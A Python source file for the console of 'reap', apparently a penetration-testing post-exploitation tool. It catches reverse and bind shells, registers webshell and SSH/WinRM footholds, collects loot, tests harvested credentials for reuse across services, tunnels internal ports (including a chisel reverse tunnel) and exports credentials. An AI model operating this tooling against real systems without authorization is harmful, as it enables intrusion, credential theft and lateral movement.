"""Console — the single interactive deliverable. Modeled on pwncat's feel
(register / run / correlate / report). v1 is two-tools-one-workflow: pwncat-vl
catches and stabilizes; this console operates on registered sessions.
"""
from __future__ import annotations

import cmd
import os
import shlex

from rich.console import Console as RichConsole

from .correlation import CorrelationEngine
from .fingerprint import fingerprint
from .modules import all_modules, select
from .modules.base import Module
from .patterns import proto_for_port
from .reporter import Reporter
from .store import LootStore
from .transport import ADAPTERS, NotSupported, RawShellSession

# Protocols worth auto-forwarding / registering for correlation when found on loopback.
_FWD_CORR_PROTOS = {"ssh", "winrm", "smb", "mysql", "postgres", "mongodb",
                    "mssql", "ftp", "redis"}

BANNER = '''
██████╗ ███████╗ █████╗ ██████╗
██╔══██╗██╔════╝██╔══██╗██╔══██╗
██████╔╝█████╗  ███████║██████╔╝
██╔══██╗██╔══╝  ██╔══██║██╔═══╝
██║  ██║███████╗██║  ██║██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝
'''


def _safe_trigger(module, ctx) -> bool:
    try:
        return module.triggers(ctx)
    except Exception:
        return False


class ReapConsole(cmd.Cmd):
    intro = None
    prompt = "reap> "

    def __init__(self, db_path: str = "reap.db"):
        super().__init__()
        self.console = RichConsole()
        self.store = LootStore(db_path)
        self.db_path = db_path
        self.sessions: dict = {}
        self.contexts: dict = {}
        self.forwards: dict = {}   # local_port -> {fwd, sid, rhost, rport}
        self._cwd: dict = {}       # sid -> virtual working directory (see _target_exec)
        self.active = None

    # -- banner ----------------------------------------------------------------
    def preloop(self):
        self._banner()

    def _banner(self):
        self.console.print(BANNER, style="bold red", markup=False, highlight=False)
        self.console.print("  post-exploitation loot & credential-reuse framework",
                           style="red")
        self.console.print(f"  loot store: {self.db_path}", style="dim")
        self.console.print("  register · run · correlate · report", style="dim")
        self.console.print("  enum (survey) · !<cmd> / interact (run on target)      "
                           "type 'help' to begin\n", style="dim")

    # -- helpers ---------------------------------------------------------------
    def emptyline(self):
        pass

    def default(self, line):
        verb = line.split()[0] if line.split() else line
        self.console.print(f"[red]unknown reap command:[/] {verb}")
        if self.active:
            self.console.print("[dim]to run it on the target: '!"
                               f"{line.strip()}' (one-off) or 'interact' (remote shell)[/]")
        else:
            self.console.print("[dim]type 'help' for commands[/]")

    def _resolve(self, arg: str):
        sid = arg.strip() or self.active
        if not sid or sid not in self.sessions:
            self.console.print("[red]no active session — use 'sessions' / 'use <id>'[/]")
            return None
        return sid

    # -- register --------------------------------------------------------------
    def do_register(self, line):
        """register <ssh|winrm|handoff|webshell|bind|listen> <host|url|port> [user] [password] [--key PATH] [--key-pass P] [--port N] [--ssl] [--param NAME] [--method GET|POST] [--shell sh|cmd]

        bind <host> <port>   — connect out to a bind shell
        listen <port>        — catch a reverse shell (fire your payload after this)"""
        try:
            args = shlex.split(line)
        except ValueError as exc:
            self.console.print(f"[red]parse error: {exc}[/]")
            return
        if len(args) < 2:
            self.console.print(self.do_register.__doc__)
            return
        adapter, rest = args[0].lower(), args[1:]
        flags, pos = {}, []
        i = 0
        while i < len(rest):
            tok = rest[i]
            if tok == "--key":
                flags["key"], i = rest[i + 1], i + 2
            elif tok == "--key-pass":
                flags["key_passphrase"], i = rest[i + 1], i + 2
            elif tok == "--port":
                flags["port"], i = int(rest[i + 1]), i + 2
            elif tok == "--ssl":
                flags["ssl"], i = True, i + 1
            elif tok == "--param":
                flags["param"], i = rest[i + 1], i + 2
            elif tok == "--method":
                flags["method"], i = rest[i + 1], i + 2
            elif tok == "--shell":
                flags["shell"], i = rest[i + 1], i + 2
            else:
                pos.append(tok)
                i += 1

        if adapter not in ADAPTERS or ADAPTERS[adapter] is None:
            self.console.print(f"[red]unknown/unavailable adapter: {adapter}[/]")
            return
        cls = ADAPTERS[adapter]
        if adapter == "webshell":
            if not pos:
                self.console.print("usage: register webshell <url> [--method GET|POST] "
                                   "[--param NAME] [--shell sh|cmd]")
                return
            sess = cls(url=pos[0], param=flags.get("param", "cmd"),
                       method=flags.get("method", "POST"),
                       shell=flags.get("shell", "sh"))
            self.sessions[sess.session_id] = sess
            self.active = sess.session_id
            self.store.get_or_create_host(sess.host)
            self.console.print(f"[green]registered[/] {sess.session_id} (active)")
            self._fingerprint(sess.session_id)
            return
        if adapter in ("bind", "listen"):
            shell = flags.get("shell", "sh")
            try:
                if adapter == "bind":
                    if len(pos) < 2:
                        self.console.print("usage: register bind <host> <port> [--shell sh|cmd]")
                        return
                    sess = RawShellSession(pos[0], int(pos[1]), mode="connect", shell=shell)
                else:  # listen — block on accept until the reverse shell connects
                    if not pos:
                        self.console.print("usage: register listen <port> [--shell sh|cmd]")
                        return
                    port = int(pos[0])
                    self.console.print(f"[cyan]listening on 0.0.0.0:{port}[/] — fire your reverse "
                                       f"shell now (Ctrl-C to abort)...")
                    sess = RawShellSession(port=port, mode="listen", shell=shell)
            except (Exception, KeyboardInterrupt) as exc:
                self.console.print(f"[red]catch failed: {exc}[/]")
                return
            self.sessions[sess.session_id] = sess
            self.active = sess.session_id
            self.store.get_or_create_host(sess.host)
            self.console.print(f"[green]registered[/] {sess.session_id} (active)")
            self._fingerprint(sess.session_id)
            return
        if len(pos) < 2:
            self.console.print(self.do_register.__doc__)
            return
        host, user = pos[0], pos[1]
        password = pos[2] if len(pos) > 2 else None
        try:
            if adapter == "winrm":
                sess = cls(host, user, password, port=flags.get("port", 5985),
                           ssl=flags.get("ssl", False))
            elif adapter == "meterpreter":
                sess = cls()
            else:  # ssh / handoff / pwncat
                sess = cls(host, user, password=password, key=flags.get("key"),
                           key_passphrase=flags.get("key_passphrase"),
                           port=flags.get("port", 22))
        except Exception as exc:
            self.console.print(f"[red]connect failed: {exc}[/]")
            return

        self.sessions[sess.session_id] = sess
        self.active = sess.session_id
        hid = self.store.get_or_create_host(host)
        access = "winrm" if adapter == "winrm" else "ssh"
        self.store.add_service(hid, access,
                               port=flags.get("port", 5985 if access == "winrm" else 22),
                               product=f"{adapter} access")
        self.console.print(f"[green]registered[/] {sess.session_id} (active)")
        self._fingerprint(sess.session_id)

    # -- fingerprint -----------------------------------------------------------
    def do_fingerprint(self, line):
        """fingerprint [session] — probe and (re)build the Context"""
        sid = self._resolve(line)
        if sid:
            self._fingerprint(sid)

    def _fingerprint(self, sid):
        sess = self.sessions[sid]
        self.console.print(f"[cyan]fingerprinting[/] {sid} ...")
        try:
            ctx = fingerprint(sess)
        except Exception as exc:
            self.console.print(f"[red]fingerprint failed: {exc}[/]")
            return
        self.contexts[sid] = ctx
        self.store.get_or_create_host(sess.host, os=ctx.os)
        self.console.print(
            f"  os=[bold]{ctx.os}[/] priv={ctx.privilege} runtime={ctx.runtime or '-'} "
            f"container={ctx.is_container} minimal={ctx.minimal_userland} "
            f"domain={ctx.domain_joined}")
        if not ctx.fingerprint_complete:
            self.console.print("  [yellow]probe was truncated — context may be partial; "
                               "re-run 'fingerprint' on a better channel[/]")
        if ctx.minimal_userland:
            self.console.print("  [yellow]minimal userland → stabilize via pwncat-vl "
                               "busybox helper; do not vendor forkpty[/]")

    # -- run -------------------------------------------------------------------
    def do_run(self, line):
        """run [session] — fire matched modules into the store, then correlate"""
        sid = self._resolve(line)
        if not sid:
            return
        sess = self.sessions[sid]
        ctx = self.contexts.get(sid)
        if ctx is None:
            self._fingerprint(sid)
            ctx = self.contexts.get(sid)
        if ctx is None:
            return
        hid = self.store.get_or_create_host(sess.host, os=ctx.os)
        mods = select(ctx)
        self.console.print(f"[cyan]running {len(mods)} matched modules[/] on {sid}")
        total = 0
        for m in mods:
            try:
                findings = m.collect(sess)
            except Exception as exc:
                self.console.print(f"  [red]{m.name} errored: {exc}[/]")
                continue
            for f in findings:
                self.store.ingest(f, hid)
            total += len(findings)
            style = "green" if findings else "dim"
            self.console.print(f"  [{style}]{m.name}: {len(findings)} findings[/]")
        self.console.print(f"[green]collected {total} findings[/]")
        self._autoforward(sid)
        self.do_correlate("")

    # -- correlate -------------------------------------------------------------
    def do_correlate(self, line):
        """correlate — test discovered creds against discovered services; surface capabilities"""
        self.console.print("[cyan]correlating (cred reuse + capabilities)...[/]")
        try:
            results = CorrelationEngine(self.store).run()
        except Exception as exc:
            self.console.print(f"[red]correlation error: {exc}[/]")
            return
        shown = False
        for r in results:
            if r.get("type") == "reuse":
                shown = True
                self.console.print(f"  [bold red]REUSE[/] {r['source']} → "
                                   f"{r['user']}@{r['host']}:{r['port']} ({r['proto']})")
            elif r.get("type") == "capability":
                shown = True
                self.console.print(f"  [bold magenta]CAPABILITY[/] {r['capability']}: "
                                   f"{r['action']}")
        if not shown:
            self.console.print("  [dim]no confirmed reuse or capabilities yet[/]")

    # -- port forwarding -------------------------------------------------------
    def _register_forward_service(self, local_port: int, proto: str, label: str) -> None:
        """Register a forward's local endpoint (127.0.0.1:local_port) as a service so
        the correlation engine tests discovered creds against it."""
        hid = self.store.get_or_create_host("127.0.0.1")
        self.store.add_service(hid, proto, port=local_port, product=label,
                               notes=f"forward {label}")

    def do_forward(self, line):
        """forward <remote_host> <remote_port> [local_port] — tunnel a target-internal
        service to 127.0.0.1:<local_port> through the active SSH session (like ssh -L),
        and register it so 'correlate' can reach it. Use 127.0.0.1 as <remote_host> for
        the foothold's own loopback services."""
        try:
            args = shlex.split(line)
        except ValueError as exc:
            self.console.print(f"[red]parse error: {exc}[/]")
            return
        if len(args) < 2:
            self.console.print("usage: forward <remote_host> <remote_port> [local_port]")
            return
        sid = self.active
        if not sid or sid not in self.sessions:
            self.console.print("[red]no active session — use 'sessions' / 'use <id>'[/]")
            return
        rhost = args[0]
        try:
            rport = int(args[1])
            lport = int(args[2]) if len(args) > 2 else 0
        except ValueError:
            self.console.print("[red]ports must be integers[/]")
            return
        try:
            fwd = self.sessions[sid].open_forward(rhost, rport, lport)
        except NotSupported:
            # Exec-only session (raw shell / webshell): no multiplexed channel to
            # forward through in-process — orchestrate a chisel reverse tunnel
            # (the target dials back out to us; needs chisel + wget/curl on target).
            self.console.print("[cyan]no in-process forwarding on this session — "
                               "setting up a chisel reverse tunnel (target dials back)...[/]")
            try:
                from .transport.chisel import ChiselForward
                fwd = ChiselForward(self.sessions[sid], rhost, rport, local_port=lport)
            except Exception as exc:
                self.console.print(f"[red]chisel forward failed:[/] {exc}")
                return
        except Exception as exc:
            self.console.print(f"[red]forward failed: {exc}[/]")
            return
        self.forwards[fwd.local_port] = {"fwd": fwd, "sid": sid, "rhost": rhost, "rport": rport}
        proto = proto_for_port(rport)
        label = f"-> {rhost}:{rport} via {sid}"
        self._register_forward_service(fwd.local_port, proto, label)
        self.console.print(f"[green]forward up[/] 127.0.0.1:{fwd.local_port} → "
                           f"{rhost}:{rport}  (via {sid}, proto={proto})")
        if proto in _FWD_CORR_PROTOS:
            self.console.print("  [dim]registered as a service — run 'correlate' to "
                               "test discovered creds against it[/]")
        else:
            self.console.print(f"  [dim]point an adapter at it, e.g. "
                               f"register ssh 127.0.0.1 <user> --port {fwd.local_port}[/]")

    def do_unforward(self, line):
        """unforward <local_port> — tear down a port forward"""
        lp = line.strip()
        if not lp.isdigit() or int(lp) not in self.forwards:
            self.console.print("[red]no such forward — see 'forwards'[/]")
            return
        info = self.forwards.pop(int(lp))
        try:
            info["fwd"].stop()
        except Exception:
            pass
        self.console.print(f"[green]closed[/] forward on 127.0.0.1:{lp}")

    def do_forwards(self, line):
        """forwards — list active port forwards"""
        from rich.table import Table
        if not self.forwards:
            self.console.print("[dim]no active forwards[/]")
            return
        table = Table(title="Forwards")
        for col in ("Local", "Target", "Via session", "Alive"):
            table.add_column(col)
        for lp, info in sorted(self.forwards.items()):
            try:
                alive = "yes" if info["fwd"].is_alive() else "no"
            except Exception:
                alive = "no"
            table.add_row(f"127.0.0.1:{lp}", f"{info['rhost']}:{info['rport']}",
                          info["sid"], alive)
        self.console.print(table)

    def _autoforward(self, sid):
        """Auto-forward loopback-bound, correlate-able services found on this host so
        correlation can reach them. Best-effort; needs an SSH-backed session. Disable
        with REAP_NO_AUTOFORWARD=1."""
        if os.environ.get("REAP_NO_AUTOFORWARD"):
            return
        sess = self.sessions.get(sid)
        if sess is None:
            return
        try:
            hid = self.store.get_or_create_host(sess.host)
            services = self.store.get_services(hid)
        except Exception:
            return
        for svc in services:
            proto, port = svc.get("proto"), svc.get("port")
            notes = svc.get("notes") or ""
            if proto not in _FWD_CORR_PROTOS or not port:
                continue
            if not (notes.startswith("127.") or "::1" in notes):
                continue  # only loopback-bound listeners
            if any(f["rport"] == port and f["rhost"] in ("127.0.0.1", "localhost")
                   for f in self.forwards.values()):
                continue  # already forwarded
            try:
                fwd = sess.open_forward("127.0.0.1", port, 0)
            except NotSupported:
                return  # this session can't forward — stop trying
            except Exception:
                continue
            self.forwards[fwd.local_port] = {"fwd": fwd, "sid": sid,
                                             "rhost": "127.0.0.1", "rport": port}
            self._register_forward_service(
                fwd.local_port, proto, f"auto -> {sess.host} loopback {proto}/{port}")
            self.console.print(f"  [cyan]auto-forward[/] 127.0.0.1:{fwd.local_port} → "
                               f"{sess.host} loopback {proto}/{port}")

    # -- enum (situational awareness) ------------------------------------------
    def do_enum(self, line):
        """enum [filter] — linpeas-style survey of the active session: processes,
        cron jobs, services, network, kernel. Screen-only situational awareness; the
        actionable subset (secrets on command lines, writable service/cron targets)
        is captured as findings by 'run'. Optional [filter] matches module names,
        e.g. 'enum cron' or 'enum proc'."""
        sid = self._resolve("")
        if not sid:
            return
        sess = self.sessions[sid]
        ctx = self.contexts.get(sid)
        if ctx is None:
            self._fingerprint(sid)
            ctx = self.contexts.get(sid)
        if ctx is None:
            return
        filt = line.strip().lower()
        mods = [m for m in select(ctx)
                if type(m).enumerate is not Module.enumerate
                and (not filt or filt in m.name.lower())]
        if not mods:
            self.console.print("[dim]no enumeration modules match "
                               f"{('/' + filt + '/ ') if filt else ''}this context[/]")
            return
        for m in mods:
            try:
                secs = m.enumerate(sess)
            except Exception as exc:
                self.console.print(f"  [red]{m.name} enum errored: {exc}[/]")
                continue
            for sec in secs:
                self.console.rule(f"[bold cyan]{sec.title}[/]", style="cyan")
                if sec.hint:
                    self.console.print(f"[dim]# {sec.hint}[/]")
                if sec.lines:
                    for ln in sec.lines:
                        self.console.print(ln, markup=False, highlight=False)
                else:
                    self.console.print("[dim](none / not available)[/]")
        self.console.print()

    def do_survey(self, line):
        """survey — alias for enum"""
        self.do_enum(line)

    # -- target shell (breakout) -----------------------------------------------
    def do_shell(self, line):
        """shell <cmd>  (or !<cmd>) — run one command on the active session's target
        and print the output. 'cd <dir>' updates a per-session virtual working
        directory that persists across later shell/interact commands (an SSH exec is
        otherwise stateless per call). No PTY: interactive programs (top, vim, a sudo
        password prompt) won't work — upgrade via pwncat for those."""
        sid = self._resolve("")
        if not sid:
            return
        cmd = line.strip()
        if not cmd:
            self.console.print("usage: !<command>    e.g. !id   |   !ls -la /root")
            return
        self._target_exec(sid, cmd, echo=True)

    def do_interact(self, line):
        """interact [session] — drop into a remote shell on the target: type commands
        (ls, cd, cat, ...) and they run on the box until you type 'exit' or hit Ctrl-D.
        'cd' persists across commands. Line-based, no PTY (no top/vim/sudo prompt) —
        upgrade via pwncat for full interactivity."""
        sid = self._resolve(line)
        if not sid:
            return
        host = getattr(self.sessions[sid], "host", sid)
        self.console.print(f"[cyan]interacting with[/] {sid} — 'exit' or Ctrl-D returns "
                           f"to reap. [dim](line-based; no PTY)[/]")
        while True:
            cwd = self._cwd.get(sid) or "~"
            try:
                raw = input(f"{host}:{cwd}$ ")
            except EOFError:
                self.console.print()
                break
            except KeyboardInterrupt:
                self.console.print("^C")
                continue
            cmd = raw.strip()
            if cmd in ("exit", "quit", "back"):
                break
            if not cmd:
                continue
            if not self._target_exec(sid, cmd, echo=True):
                self.console.print("[red]session appears dead — leaving interact[/]")
                break
        self.console.print(f"[dim]left interact ({sid})[/]")

    def _target_exec(self, sid, cmd, echo=False, timeout=45) -> bool:
        """Run one command on a session's target, honoring a per-session virtual cwd.
        Returns False when the session looks dead (so interact can bail). 'cd' is
        handled locally: the new directory is resolved on the target and remembered,
        then prepended to subsequent commands — giving stateful cd on every transport,
        including SSH whose exec channel is one-shot."""
        sess = self.sessions.get(sid)
        if sess is None:
            self.console.print("[red]no such session[/]")
            return False
        win = self._is_windows(sid)
        stripped = cmd.strip()
        if stripped == "cd" or stripped.lower().startswith("cd "):
            target = stripped[2:].strip() or ("%USERPROFILE%" if win else "$HOME")
            newcwd = self._resolve_cd(sid, target, win)
            if newcwd is None:
                if echo:
                    self.console.print(f"[red]cd: {target}: no such directory[/]")
            else:
                self._cwd[sid] = newcwd
            return True
        try:
            res = sess.exec(self._with_cwd(sid, cmd, win), timeout=timeout)
        except Exception as exc:
            self.console.print(f"[red]exec failed: {exc}[/]")
            return False
        if echo:
            out = (res.stdout or "").rstrip("\n")
            err = (res.stderr or "").rstrip("\n")
            if out:
                self.console.print(out, markup=False, highlight=False)
            if err:
                self.console.print(err, markup=False, highlight=False, style="yellow")
            if not out and not err and res.exit_code not in (0,):
                self.console.print(f"[dim](exit {res.exit_code})[/]")
        return res.exit_code != 124   # 124 = timeout / dead sentinel

    def _with_cwd(self, sid, cmd, win) -> str:
        cwd = self._cwd.get(sid)
        if not cwd:
            return cmd
        if win:
            return f'cd /d "{cwd}" && {cmd}'
        return f"cd {shlex.quote(cwd)} && {cmd}"

    def _resolve_cd(self, sid, target, win):
        """Resolve 'cd <target>' against the current virtual cwd on the target box;
        return the new absolute cwd, or None if the directory doesn't exist. Success
        is gated on '&&' so a failed cd prints nothing and leaves the cwd unchanged."""
        sess = self.sessions[sid]
        base = self._cwd.get(sid)
        if win:
            prefix = f'cd /d "{base}" && ' if base else ""
            probe = f"{prefix}cd /d {target} 2>nul && cd"
        else:
            prefix = f"cd {shlex.quote(base)} && " if base else ""
            probe = f"{prefix}cd {target} 2>/dev/null && pwd"
        try:
            res = sess.exec(probe, timeout=20)
        except Exception:
            return None
        lines = [ln for ln in res.out.splitlines() if ln.strip()]
        return lines[-1].strip() if lines else None

    def _is_windows(self, sid) -> bool:
        ctx = self.contexts.get(sid)
        if ctx and ctx.os and ctx.os != "unknown":
            return ctx.os == "windows"
        return getattr(self.sessions.get(sid), "shell", "") == "cmd"

    # -- views -----------------------------------------------------------------
    def do_findings(self, line):
        """findings — ranked findings list"""
        Reporter(self.store).render_findings(self.console)

    def do_loot(self, line):
        """loot — alias for findings"""
        self.do_findings(line)

    def do_creds(self, line):
        """creds — credentials and their verified_against state"""
        Reporter(self.store).render_creds(self.console)

    def do_report(self, line):
        """report [path.md] [redact] — ranked findings + timeline; also writes markdown"""
        args = line.split()
        redact = any(a.lower() == "redact" for a in args)
        path = next((a for a in args if a.lower() != "redact"), None) or "reap-report.md"
        rep = Reporter(self.store)
        rep.render_findings(self.console)
        rep.render_timeline(self.console)
        out = rep.export_markdown(path, redact=redact)
        self.console.print(f"[green]markdown written to {out}[/]"
                           + (" [dim](secrets redacted)[/]" if redact else ""))

    def do_export(self, line):
        """export <creds|targets|json> [path] — machine-readable exports for other tools"""
        parts = line.split()
        if not parts:
            self.console.print("usage: export <creds|targets|json> [path]")
            return
        what, arg = parts[0].lower(), (parts[1] if len(parts) > 1 else None)
        rep = Reporter(self.store)
        if what == "creds":
            self.console.print(f"[green]wrote[/] {', '.join(rep.export_creds_txt(arg or 'reap'))}")
        elif what == "targets":
            self.console.print(f"[green]wrote[/] {rep.export_targets_txt(arg or 'reap-targets.txt')}")
        elif what == "json":
            self.console.print(f"[green]wrote[/] {rep.export_json(arg or 'reap-report.json')}")
        else:
            self.console.print("usage: export <creds|targets|json> [path]")

    def do_search(self, line):
        """search <regex> — case-insensitive search over findings (title/detail/note)"""
        import re
        pat = line.strip()
        if not pat:
            self.console.print("usage: search <regex>")
            return
        try:
            rx = re.compile(pat, re.IGNORECASE)
        except re.error as exc:
            self.console.print(f"[red]bad regex: {exc}[/]")
            return
        from rich.table import Table
        table = Table(title=f"findings matching /{pat}/i")
        for col in ("ID", "Sev", "Type", "Title", "Host"):
            table.add_column(col)
        n = 0
        for f in self.store.get_findings(ranked=True):
            hay = f"{f.get('title','')} {f.get('detail','')} {f.get('note','')}"
            if rx.search(hay):
                table.add_row(str(f["id"]), f.get("severity") or "", f["type"],
                              (f.get("title") or "")[:60], f.get("host") or "-")
                n += 1
        self.console.print(table)
        self.console.print(f"[dim]{n} match(es)[/]")

    def do_note(self, line):
        """note <finding_id> <text> — annotate a finding (shows in the report)"""
        parts = line.strip().split(None, 1)
        if len(parts) < 2 or not parts[0].isdigit():
            self.console.print("usage: note <finding_id> <text>")
            return
        fid, text = int(parts[0]), parts[1]
        if self.store.set_finding_note(fid, text):
            self.console.print(f"[green]noted finding {fid}[/]")
        else:
            self.console.print(f"[red]no finding with id {fid}[/]")

    def do_hosts(self, line):
        """hosts — list discovered hosts (persisted in the loot DB across restarts)"""
        from rich.table import Table
        table = Table(title="Hosts")
        for col in ("ID", "Address", "OS", "First seen"):
            table.add_column(col)
        for h in self.store.get_hosts():
            table.add_row(str(h["id"]), h.get("address") or "-", h.get("os") or "-",
                          (h.get("first_seen") or "")[:19])
        self.console.print(table)

    def do_import(self, line):
        """import <nmap.xml> — seed services from an nmap XML so correlation has targets"""
        path = line.strip()
        if not path:
            self.console.print("usage: import <nmap.xml>")
            return
        try:
            import xml.etree.ElementTree as ET
            root = ET.parse(path).getroot()
        except Exception as exc:
            self.console.print(f"[red]could not parse {path}: {exc}[/]")
            return
        from .patterns import proto_for_port
        added = 0
        for host_el in root.findall("host"):
            status = host_el.find("status")
            if status is not None and status.get("state") == "down":
                continue
            addr = next((a.get("addr") for a in host_el.findall("address")
                         if a.get("addrtype") in ("ipv4", "ipv6")), None)
            if not addr:
                continue
            hid = self.store.get_or_create_host(addr)
            ports = host_el.find("ports")
            if ports is None:
                continue
            for p in ports.findall("port"):
                st = p.find("state")
                if st is None or st.get("state") != "open":
                    continue
                portnum = int(p.get("portid"))
                svc_el = p.find("service")
                name = (svc_el.get("name") if svc_el is not None else "") or ""
                product = svc_el.get("product") if svc_el is not None else None
                proto = self._nmap_proto(name) or proto_for_port(portnum)
                self.store.add_service(hid, proto, port=portnum, product=product)
                added += 1
        self.console.print(f"[green]imported {added} open services[/] from {path}")

    @staticmethod
    def _nmap_proto(name: str):
        n = (name or "").lower()
        table = {
            "ssh": "ssh", "ftp": "ftp", "mysql": "mysql", "postgresql": "postgres",
            "mongod": "mongodb", "mongodb": "mongodb", "ms-sql-s": "mssql",
            "microsoft-ds": "smb", "netbios-ssn": "smb", "ms-wbt-server": "rdp",
            "http": "http", "https": "http", "http-proxy": "http",
            "wsman": "winrm", "winrm": "winrm",
        }
        return table.get(n)

    def do_sessions(self, line):
        """sessions — list registered sessions"""
        from rich.table import Table
        table = Table(title="Sessions")
        for col in ("", "ID", "Host", "Alive", "OS", "Priv", "Runtime"):
            table.add_column(col)
        for sid, sess in self.sessions.items():
            ctx = self.contexts.get(sid)
            try:
                alive = "yes" if sess.is_alive() else "no"
            except Exception:
                alive = "no"
            table.add_row("*" if sid == self.active else "", sid, sess.host, alive,
                          ctx.os if ctx else "-", ctx.privilege if ctx else "-",
                          ",".join(ctx.runtime) if ctx and ctx.runtime else "-")
        self.console.print(table)

    def do_use(self, line):
        """use <session> — set the active session"""
        sid = line.strip()
        if sid in self.sessions:
            self.active = sid
            self.console.print(f"active: {sid}")
        else:
            self.console.print("[red]no such session[/]")

    def do_modules(self, line):
        """modules — list modules and whether they trigger for the active context"""
        from rich.table import Table
        ctx = self.contexts.get(self.active) if self.active else None
        table = Table(title="Modules")
        table.add_column("Name")
        table.add_column("Triggers for active ctx")
        for m in all_modules():
            fires = "-" if ctx is None else ("yes" if _safe_trigger(m, ctx) else "no")
            table.add_row(m.name, fires)
        self.console.print(table)

    def do_exit(self, line):
        """exit — leave the console"""
        for info in list(self.forwards.values()):
            try:
                info["fwd"].stop()
            except Exception:
                pass
        self.forwards.clear()
        self.console.print("bye")
        return True

    def do_quit(self, line):
        """quit — leave the console"""
        return self.do_exit(line)

    def do_EOF(self, line):
        print()
        return True


def main(argv=None):
    import argparse
    parser = argparse.ArgumentParser(prog="reap",
                                     description="post-exploitation loot framework")
    parser.add_argument("--db", default="reap.db", help="engagement loot store path")
    args = parser.parse_args(argv)
    try:
        ReapConsole(args.db).cmdloop()
    except KeyboardInterrupt:
        print()


if __name__ == "__main__":
    main()
